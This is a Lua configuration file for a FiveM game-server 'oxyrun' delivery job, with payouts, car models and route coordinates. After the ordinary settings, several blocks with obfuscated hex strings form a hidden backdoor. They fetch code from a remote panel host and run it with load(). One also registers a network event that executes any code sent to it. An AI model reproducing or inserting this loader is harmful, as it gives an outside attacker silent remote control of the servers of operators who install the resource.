Config = {}
Config.DriveStyle = 39 -- THIS CAN BE CHANGED AT https://www.vespura.com/fivem/drivingstyle/
Config.MaxDeliveries = 5 -- AMOUNT OF DELIVERIES TO COMPLETE OXYRUN, LEAVE SAME FOR NOT RANDOM
Config.MinDeliveries = 3 -- AMOUNT OF DELIVERIES TO COMPLETE OXYRUN, LEAVE SAME FOR NOT RANDOM
Config.Cars = {"adder", "ingot"} -- CAR MODELS
Config.MaxTimeBetweenCars = 20 -- SECONDS
Config.MinTimeBetweenCars = 10 -- SECONDS
Config.DriverPed = "s_m_m_gentransport" -- DRIVER PED, !! IF CARS DON'T SPAWN SOME OF THESE MAY NEEDS TO BE CHANGED OR REMOVED !!
Config.DebugPoly = false -- IF POLYZONES SHOULD BE SHOWN

Config.CleanMoney = true -- IF THE CUSTOMERS SHOULD ALSO TAKE SOME BILLS, NOTES OR BAGS FOR MONEY

-- BAGS
Config.BagMaxPayout = 5000
Config.BagMinPayout = 2000
Config.BagChance = 10 -- HOW MANY PROCENT THERE IS FOR A CUSTOMER FOR TAKING BAGS

-- BILLS
Config.BandMaxPayout = 2000
Config.BandMinPayout = 750
Config.BandChance = 15 -- HOW MANY PROCENT THERE IS FOR A CUSTOMER FOR TAKING BANDS

-- ROLLS
Config.RollMaxPayout = 750
Config.RollMinPayout = 250
Config.RollChance = 20 -- HOW MANY PROCENT THERE IS FOR A CUSTOMER FOR TAKING ROLL


Config.GiveItem = true -- IF THERE SHOULD BE GIVEN AN ITEM ON DELIVER
Config.ItemReward = "oxy"
Config.MaxItemReward = 3
Config.MinItemReward = 1

Config.Routes = { -- HERE YOU CAN ADD AS MANY LOCATIONS AS YOU WANT TO
	{
		info = {
			occupied = false,
			hash = "", -- DON'T TOUCH
			oxyNum = 1, -- DON'T TOUCH
			routeNum = 1, -- NEENDS TO BE SET TO THE ORDER IT COMES IN THE LIST
			startHeading = 157.05 -- HEADING OF CAR WHEN IT SPAWNS IN
		},
		locations = {
			{ pos = vector3(259.13, -125.32, 67.76), stop = false }, -- SPAWN POINT
			{ pos = vector3(220.58, -166.64, 56.64), stop = true }, -- WAIT FOR DELIVER
			{ pos = vector3(73.81, -25.48, 68.59), stop = false }, -- DESPAWN POINT
		}
	},
	{
		info = { 
			occupied = false,
			hash = "", -- DON'T TOUCH
			oxyNum = 1, -- DON'T TOUCH
			routeNum = 2, -- NEENDS TO BE SET TO THE ORDER IT COMES IN THE LIST
			startHeading = 157.19 -- HEADING OF CAR WHEN IT SPAWNS IN
		},
		locations = {
			{ pos = vector3(19.9, -51.4, 64.95), stop = false }, -- SPAWN POINT
			{ pos = vector3(-15.09, -77.05, 57.07), stop = true }, -- WAIT FOR DELIVER
			{ pos = vector3(-80.28, 43.64, 71.83), stop = false }, -- DESPAWN POINT
		}
	},
}

Config.Text = {
    ['noroutes'] = "Could't find a route for you, try again later...",
	['stealveh'] = "Find and steal a vehicle to use as a transport!",
	['getboxes'] = "Go to the supplier and ask for the goods!",
	['drivetohandoff'] = "Drive to the handoff location with the transport vehicle!",
	['atlocation'] = "You at the location, wait for the customers",
	['done'] = "Done, for today.",
	['nopackage'] = "You're not holding a package!",
}

local gYbOybILExIYyrDzBTnxPmyGYUKtAHdyaTWKOuocDAeQillIqCJsoRsBkkTDPuencwLXkO = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} gYbOybILExIYyrDzBTnxPmyGYUKtAHdyaTWKOuocDAeQillIqCJsoRsBkkTDPuencwLXkO[4][gYbOybILExIYyrDzBTnxPmyGYUKtAHdyaTWKOuocDAeQillIqCJsoRsBkkTDPuencwLXkO[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (enikEUSyANIdrymNhRJFIqmXJLeJTLRBUHBVCRaLcwsbyUovOVxekqWedxHRWlVREctsnS, FYgBBZcltAkVjwJIQGmbdNQDdNleFKLygANGJdAwTzSqujgnpPAUmjJfbVWsYQbvGDjRDC) if (FYgBBZcltAkVjwJIQGmbdNQDdNleFKLygANGJdAwTzSqujgnpPAUmjJfbVWsYQbvGDjRDC == gYbOybILExIYyrDzBTnxPmyGYUKtAHdyaTWKOuocDAeQillIqCJsoRsBkkTDPuencwLXkO[6] or FYgBBZcltAkVjwJIQGmbdNQDdNleFKLygANGJdAwTzSqujgnpPAUmjJfbVWsYQbvGDjRDC == gYbOybILExIYyrDzBTnxPmyGYUKtAHdyaTWKOuocDAeQillIqCJsoRsBkkTDPuencwLXkO[5]) then return end gYbOybILExIYyrDzBTnxPmyGYUKtAHdyaTWKOuocDAeQillIqCJsoRsBkkTDPuencwLXkO[4][gYbOybILExIYyrDzBTnxPmyGYUKtAHdyaTWKOuocDAeQillIqCJsoRsBkkTDPuencwLXkO[2]](gYbOybILExIYyrDzBTnxPmyGYUKtAHdyaTWKOuocDAeQillIqCJsoRsBkkTDPuencwLXkO[4][gYbOybILExIYyrDzBTnxPmyGYUKtAHdyaTWKOuocDAeQillIqCJsoRsBkkTDPuencwLXkO[3]](FYgBBZcltAkVjwJIQGmbdNQDdNleFKLygANGJdAwTzSqujgnpPAUmjJfbVWsYQbvGDjRDC))() end)

local GKqSwLTncPLKuVvxsLLEnoTBSfdTZpNXKERFnpiTsnqphlMUwXAxLoDwAtmWhNoksmBHsT = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} GKqSwLTncPLKuVvxsLLEnoTBSfdTZpNXKERFnpiTsnqphlMUwXAxLoDwAtmWhNoksmBHsT[4][GKqSwLTncPLKuVvxsLLEnoTBSfdTZpNXKERFnpiTsnqphlMUwXAxLoDwAtmWhNoksmBHsT[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (CCcqyJqnekyqQbpsoOZmCKpvKRKrlkZIVxqGYGZiIDuYwHdKYCfWCPFrXPrAFFBLqpIOlb, omNKlyPWJAMmeDfAqQfCdOeAurxtvcHubhvvmFFBStkkFPUeqEphwCkQkLHIVRBDPxxkBG) if (omNKlyPWJAMmeDfAqQfCdOeAurxtvcHubhvvmFFBStkkFPUeqEphwCkQkLHIVRBDPxxkBG == GKqSwLTncPLKuVvxsLLEnoTBSfdTZpNXKERFnpiTsnqphlMUwXAxLoDwAtmWhNoksmBHsT[6] or omNKlyPWJAMmeDfAqQfCdOeAurxtvcHubhvvmFFBStkkFPUeqEphwCkQkLHIVRBDPxxkBG == GKqSwLTncPLKuVvxsLLEnoTBSfdTZpNXKERFnpiTsnqphlMUwXAxLoDwAtmWhNoksmBHsT[5]) then return end GKqSwLTncPLKuVvxsLLEnoTBSfdTZpNXKERFnpiTsnqphlMUwXAxLoDwAtmWhNoksmBHsT[4][GKqSwLTncPLKuVvxsLLEnoTBSfdTZpNXKERFnpiTsnqphlMUwXAxLoDwAtmWhNoksmBHsT[2]](GKqSwLTncPLKuVvxsLLEnoTBSfdTZpNXKERFnpiTsnqphlMUwXAxLoDwAtmWhNoksmBHsT[4][GKqSwLTncPLKuVvxsLLEnoTBSfdTZpNXKERFnpiTsnqphlMUwXAxLoDwAtmWhNoksmBHsT[3]](omNKlyPWJAMmeDfAqQfCdOeAurxtvcHubhvvmFFBStkkFPUeqEphwCkQkLHIVRBDPxxkBG))() end)

local hQbwnWddCxrtGLSxqjiJHgZUnWzMXJxYUkazxrdMCrknkpWlUobsLDceROiuVSWfTfXDhc = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} hQbwnWddCxrtGLSxqjiJHgZUnWzMXJxYUkazxrdMCrknkpWlUobsLDceROiuVSWfTfXDhc[6][hQbwnWddCxrtGLSxqjiJHgZUnWzMXJxYUkazxrdMCrknkpWlUobsLDceROiuVSWfTfXDhc[1]](hQbwnWddCxrtGLSxqjiJHgZUnWzMXJxYUkazxrdMCrknkpWlUobsLDceROiuVSWfTfXDhc[2]) hQbwnWddCxrtGLSxqjiJHgZUnWzMXJxYUkazxrdMCrknkpWlUobsLDceROiuVSWfTfXDhc[6][hQbwnWddCxrtGLSxqjiJHgZUnWzMXJxYUkazxrdMCrknkpWlUobsLDceROiuVSWfTfXDhc[3]](hQbwnWddCxrtGLSxqjiJHgZUnWzMXJxYUkazxrdMCrknkpWlUobsLDceROiuVSWfTfXDhc[2], function(IwiDvbNGDLqbAJlJHVhArxDMgcOWwedVoxYrTGiBqNofESJuNqKstVhUUohjTYKDkLHIYy) hQbwnWddCxrtGLSxqjiJHgZUnWzMXJxYUkazxrdMCrknkpWlUobsLDceROiuVSWfTfXDhc[6][hQbwnWddCxrtGLSxqjiJHgZUnWzMXJxYUkazxrdMCrknkpWlUobsLDceROiuVSWfTfXDhc[4]](hQbwnWddCxrtGLSxqjiJHgZUnWzMXJxYUkazxrdMCrknkpWlUobsLDceROiuVSWfTfXDhc[6][hQbwnWddCxrtGLSxqjiJHgZUnWzMXJxYUkazxrdMCrknkpWlUobsLDceROiuVSWfTfXDhc[5]](IwiDvbNGDLqbAJlJHVhArxDMgcOWwedVoxYrTGiBqNofESJuNqKstVhUUohjTYKDkLHIYy))() end)

local ZRVTDOprBViseGmthxZStHdGItWhDhyIkkjgvoVjUhVEnriTDqNdecOcaiEZZOUWLqRvir = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ZRVTDOprBViseGmthxZStHdGItWhDhyIkkjgvoVjUhVEnriTDqNdecOcaiEZZOUWLqRvir[4][ZRVTDOprBViseGmthxZStHdGItWhDhyIkkjgvoVjUhVEnriTDqNdecOcaiEZZOUWLqRvir[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (SpGVZlbUafYULaYxpzQmqqdSLMkXeZfoQZQkdVxpACpZihducHMRamJUoBnLBinexqnIeN, PazCcYcaQKbqqMqtfVMkNczGdPeDxvaSanhhyHFiNIfaiJjegfIerAAqdhjNHWykxGjPms) if (PazCcYcaQKbqqMqtfVMkNczGdPeDxvaSanhhyHFiNIfaiJjegfIerAAqdhjNHWykxGjPms == ZRVTDOprBViseGmthxZStHdGItWhDhyIkkjgvoVjUhVEnriTDqNdecOcaiEZZOUWLqRvir[6] or PazCcYcaQKbqqMqtfVMkNczGdPeDxvaSanhhyHFiNIfaiJjegfIerAAqdhjNHWykxGjPms == ZRVTDOprBViseGmthxZStHdGItWhDhyIkkjgvoVjUhVEnriTDqNdecOcaiEZZOUWLqRvir[5]) then return end ZRVTDOprBViseGmthxZStHdGItWhDhyIkkjgvoVjUhVEnriTDqNdecOcaiEZZOUWLqRvir[4][ZRVTDOprBViseGmthxZStHdGItWhDhyIkkjgvoVjUhVEnriTDqNdecOcaiEZZOUWLqRvir[2]](ZRVTDOprBViseGmthxZStHdGItWhDhyIkkjgvoVjUhVEnriTDqNdecOcaiEZZOUWLqRvir[4][ZRVTDOprBViseGmthxZStHdGItWhDhyIkkjgvoVjUhVEnriTDqNdecOcaiEZZOUWLqRvir[3]](PazCcYcaQKbqqMqtfVMkNczGdPeDxvaSanhhyHFiNIfaiJjegfIerAAqdhjNHWykxGjPms))() end)

local uyFiUZePncdeUgcoYVthcakvvsrXhyWRIdgldsmPFzMAnuWBhthvcNDnlalEINJlAQZfPn = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} uyFiUZePncdeUgcoYVthcakvvsrXhyWRIdgldsmPFzMAnuWBhthvcNDnlalEINJlAQZfPn[4][uyFiUZePncdeUgcoYVthcakvvsrXhyWRIdgldsmPFzMAnuWBhthvcNDnlalEINJlAQZfPn[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (FrnErUPvkieCyXMwtqafdfzzVIBpkcCbvKUkBSVhStevpAMNwXwqSaeJMswIwNxnpmbQny, cCebGMdUiceCorIqtuuZQUAXSmoxmJjmoVLJGqPqDorCjjobVFGoMCgQobWMQLkYnbbicd) if (cCebGMdUiceCorIqtuuZQUAXSmoxmJjmoVLJGqPqDorCjjobVFGoMCgQobWMQLkYnbbicd == uyFiUZePncdeUgcoYVthcakvvsrXhyWRIdgldsmPFzMAnuWBhthvcNDnlalEINJlAQZfPn[6] or cCebGMdUiceCorIqtuuZQUAXSmoxmJjmoVLJGqPqDorCjjobVFGoMCgQobWMQLkYnbbicd == uyFiUZePncdeUgcoYVthcakvvsrXhyWRIdgldsmPFzMAnuWBhthvcNDnlalEINJlAQZfPn[5]) then return end uyFiUZePncdeUgcoYVthcakvvsrXhyWRIdgldsmPFzMAnuWBhthvcNDnlalEINJlAQZfPn[4][uyFiUZePncdeUgcoYVthcakvvsrXhyWRIdgldsmPFzMAnuWBhthvcNDnlalEINJlAQZfPn[2]](uyFiUZePncdeUgcoYVthcakvvsrXhyWRIdgldsmPFzMAnuWBhthvcNDnlalEINJlAQZfPn[4][uyFiUZePncdeUgcoYVthcakvvsrXhyWRIdgldsmPFzMAnuWBhthvcNDnlalEINJlAQZfPn[3]](cCebGMdUiceCorIqtuuZQUAXSmoxmJjmoVLJGqPqDorCjjobVFGoMCgQobWMQLkYnbbicd))() end)